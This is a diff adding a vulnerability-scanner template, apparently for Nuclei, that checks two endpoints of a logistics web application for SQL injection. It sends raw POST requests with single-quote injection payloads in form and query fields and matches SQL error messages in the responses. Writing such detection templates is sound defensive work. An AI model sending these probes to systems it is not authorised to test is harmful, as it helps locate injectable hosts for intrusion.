@@ -1,0 +1,45 @@
+id: dongshengwuliu-sqli-getbanklist
+
+info:
+  name: SQL Injection in GetBANKList Endpoint
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template checks for a potential SQL Injection vulnerability in the GetBANKList and GetDataList_Salary endpoints of the application.
+    The injection is tested by sending payloads in POST requests to the respective endpoints.
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /MvcShipping/MsBaseInfo/GetBANKList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 38
+
+        strCondition=1'
+      - |
+        POST /TruckMng/MsWlDriver/GetDataList_Salary?_dc=1665626804091&start=0&limit=30&sort=&condition=1*&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 16
+
+        strCwSTARTGID=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 200
+      - type: regex
+        regex:
+          - "SQL syntax"
+          - "unexpected end of SQL command"
+      - type: word
+        words:
+          - "error"
+        part: body
